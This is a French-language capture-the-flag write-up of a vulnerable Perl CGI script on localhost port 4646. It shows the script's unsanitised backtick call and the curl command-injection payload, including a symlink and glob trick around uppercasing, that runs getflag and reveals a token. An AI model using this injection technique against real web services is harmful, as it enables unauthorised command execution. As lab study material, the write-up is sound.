la session contient le code d'un serveur pearl nacer en localhost sur le port 4646

```
#!/usr/bin/env perl

# localhost:4646

use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

le serveur prend des requettes avec un parametre x qui nous interesse car il va nous permettre d'executer des commandes via la ligne de code suivante:

```
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

on peut donc injecter getflag dans le parametre x pour qu'il soit executé par le serveur.

cependant cet argument est mis en majuscule et est tronquer a la premiere espace.

on cree donc un lien symbolique vers getflag dans /tmp/GETFLAG

```
ln -s /bin/getflag /tmp/GETFLAG
```

curl '127.0.0.1:4646?x=`' renvoie le flag dans les logs d'erreur, qui se site dans /var/log/apache2/error.log

ce qui veut dire que nous pouvons faire planter le serveur pour obtenir le flag dans les logs d'erreur appache

on execute donc la commande suivante:

```
curl '127.0.0.1:4646?x=`/*/GETFLAG>&2`'
```

Attention en suivant la norme web le parametre x doit etre encoder comme suit:

```
curl '127.0.0.1:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
```

# Flag
```
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```